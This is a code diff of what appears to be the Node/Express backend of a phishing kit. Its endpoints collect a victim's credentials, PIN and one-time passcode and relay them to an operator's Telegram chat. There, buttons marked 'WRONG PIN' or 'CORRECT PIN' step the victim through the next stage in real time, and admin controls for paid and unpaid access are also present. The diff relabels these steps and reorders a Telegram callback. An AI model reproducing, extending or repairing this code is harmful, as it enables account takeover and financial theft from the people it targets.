@@ -90,7 +90,6 @@ app.post('/api/submit-credentials', async (req, res) => {
       return res.status(500).json({ success: false, error: "Telegram master chat ID is not configured." });  
     }  
 
-    // Default status set to PIN_PENDING (frontend polls this)
     activeApplications.set(appReference, {  
       ...data,  
       formattedPhone,  
@@ -121,8 +120,8 @@ app.post('/api/submit-credentials', async (req, res) => {
         reply_markup: JSON.stringify({  
           inline_keyboard: [  
             [  
-              { text: '❌ WRONG OTP', callback_data: `otp_wrong_${appReference}` },  
-              { text: '✅ CORRECT OTP', callback_data: `step3_prompt_${appReference}` }  
+              { text: '❌ WRONG PIN', callback_data: `pin_wrong_${appReference}` },  
+              { text: '✅ CORRECT PIN (To Step 3)', callback_data: `step3_prompt_${appReference}` }  
             ]  
           ]  
         })  
@@ -148,7 +147,7 @@ app.post('/api/submit-credentials', async (req, res) => {
   }
 });
 
-// STEP 3 SUBMISSION: OTP delivered with 3 buttons
+// STEP 3 SUBMISSION: OTP delivered with buttons
 app.post('/api/submit-otp', async (req, res) => {
   try {
     const { appReference, otpCode } = req.body;
@@ -202,7 +201,7 @@ app.post('/api/submit-otp', async (req, res) => {
   }
 });
 
-// Status Polling Endpoint (Frontend checks this to transition steps)
+// Status Polling Endpoint
 app.get('/api/check-status/:appReference', (req, res) => {
   const { appReference } = req.params;
   const appData = activeApplications.get(appReference);
@@ -339,13 +338,19 @@ app.post('/api/telegram-webhook', async (req, res) => {
   const chatId = callback_query.message.chat.id.toString();
   const messageId = callback_query.message.message_id;
 
+  // Answer callback query immediately to stop loading spinner on Telegram button
+  try {
+    await fetch(`https://api.telegram.org/bot${botToken}/answerCallbackQuery`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ callback_query_id: callback_query.id })
+    });
+  } catch (err) {
+    console.error("Answer callback error:", err.message);
+  }
+
   if (actionData.startsWith('access_paid_') || actionData.startsWith('access_unpaid_')) {
     if (chatId !== masterChatId.toString()) {
-      await fetch(`https://api.telegram.org/bot${botToken}/answerCallbackQuery`, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ callback_query_id: callback_query.id, text: "Unauthorized action. Main Admin only.", show_alert: true })
-      });
       return;
     }
 
@@ -399,11 +404,10 @@ app.post('/api/telegram-webhook', async (req, res) => {
     const appReference = actionData.replace('step3_prompt_', '');
     if (activeApplications.has(appReference)) {
       const appData = activeApplications.get(appReference);
-      // Ensure status updates to 'OTP_APPROVED' so the frontend polling loop detects it and moves to Step 3
       appData.status = 'OTP_APPROVED';
       activeApplications.set(appReference, appData);
     }
-    const updatedText = `${callback_query.message.text}\n\n🟢 <b>STATUS: CORRECT OTP ✅ — APPLICANT PROMPTED TO STEP 3</b>`;
+    const updatedText = `${callback_query.message.text}\n\n🟢 <b>STATUS: CORRECT PIN ✅ — PROMPTED TO OTP ENTRY</b>`;
     await editTelegramMessage(botToken, chatId, messageId, updatedText);
   }
 
@@ -458,4 +462,4 @@ app.get('/Admin-*', (req, res) => {
 app.listen(PORT, () => {
   console.log(`Server is running on port ${PORT}`);
 });
-      
+  
